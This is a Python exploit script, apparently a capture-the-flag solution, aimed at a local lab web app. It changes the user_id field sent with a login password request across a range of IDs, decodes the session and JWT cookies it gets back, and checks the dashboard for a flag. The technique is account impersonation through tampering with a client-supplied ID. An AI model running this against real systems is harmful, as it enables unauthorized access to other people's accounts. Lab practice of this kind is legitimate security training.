import requests
import re

base_url = "http://127.0.0.1:32883"

print("[*] Understanding the complete auth flow with user_id manipulation\n")

# Test user_id values around the known working value 10032
test_ids = [1, 10, 100, 1000, 10000, 10030, 10031, 10032, 10033, 10034, 10035]

for user_id in test_ids:
    print(f"\n{'='*60}")
    print(f"Testing user_id={user_id}")
    print(f"{'='*60}")
    
    session = requests.Session()
    
    # Step A: POST username
    resp_a = session.post(f"{base_url}/", data={'username': 'test'}, allow_redirects=True)
    
    # Step C: POST password with modified user_id
    resp_c = session.post(
        f"{base_url}/password/test",
        data={'username': 'test', 'password': 'test', 'user_id': str(user_id)},
        allow_redirects=False
    )
    
    print(f"POST /password/test with user_id={user_id}")
    print(f"  Status: {resp_c.status_code}")
    
    # Extract cookies from Set-Cookie header
    if 'set-cookie' in resp_c.headers:
        import base64
        set_cookie = resp_c.headers['set-cookie']
        print(f"  Set-Cookie header: {set_cookie[:100]}...")
        
        # Parse session cookie
        if 'session=' in set_cookie:
            session_value = set_cookie.split('session=')[1].split(';')[0]
            print(f"  Session cookie: {session_value}")
            
            # Decode session
            try:
                parts = session_value.split('.')
                decoded = base64.urlsafe_b64decode(parts[0] + '==')
                print(f"  Session decoded: {decoded}")
            except:
                pass
        
        # Parse auth_token cookie
        if 'auth_token=' in set_cookie:
            auth_value = set_cookie.split('auth_token=')[1].split(';')[0]
            print(f"  Auth token: {auth_value[:50]}...")
            
            # Decode JWT payload
            try:
                import json
                parts = auth_value.split('.')
                if len(parts) >= 2:
                    decoded = base64.urlsafe_b64decode(parts[1] + '==')
                    payload = json.loads(decoded)
                    print(f"  JWT payload: {payload}")
            except:
                pass
    
    # Now try to access dashboard
    # Manually set cookies from Set-Cookie header
    for cookie in resp_c.cookies:
        session.cookies.set(cookie.name, cookie.value)
    
    resp_d = session.get(f"{base_url}/dashboard", allow_redirects=True)
    print(f"\nGET /dashboard")
    print(f"  Status: {resp_d.status_code}")
    print(f"  Content length: {len(resp_d.content)}B")
    print(f"  Final URL: {resp_d.url}")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', resp_d.text)
    if flag_match:
        print(f"\n[!!! FLAG FOUND !!!]")
        print(f"[!] FLAG: {flag_match.group(0)}")
        print(f"\nFull response:")
        print(resp_d.text)
        break
    
    # Check if we successfully accessed dashboard
    if 'dashboard' in resp_d.url.lower() and resp_d.status_code == 200:
        print(f"  [SUCCESS] Accessed dashboard")
        # Print content preview
        if len(resp_d.text) < 2000:
            print(f"  Content: {resp_d.text}")
        else:
            print(f"  Content preview: {resp_d.text[:500]}")

